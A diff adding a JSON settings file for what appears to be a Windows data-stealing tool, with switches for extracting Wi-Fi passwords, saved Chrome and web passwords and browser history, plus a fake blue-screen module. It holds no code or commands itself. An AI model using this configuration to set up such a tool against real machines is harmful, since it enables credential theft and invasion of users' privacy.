@@ -1,0 +1,31 @@
+{   
+    "runningyn":{
+        "wifipass":"yes",
+        "webhistory":"yes",
+        "webpasswords":"yes",
+        "ipconfigall":"yes",
+        "systeminfo":"no",
+        "fakebsod":"no"
+    },
+    "wifi-pass-extractor":{
+        "save":"y",
+        "sleep-time-last":0
+    },
+
+    "web-browser-history-extractor":{
+        "print-y-n":"no",
+        "ff-json":"json",
+        "ff-csv":"csv",
+        "default-format":"json"
+    },
+
+    "chrome-pass-view":{
+        "nothing":"nothing"
+    },
+
+    "bsod":{
+        "yn":"yes",
+        "shutdown":"no"
+    }
+
+}
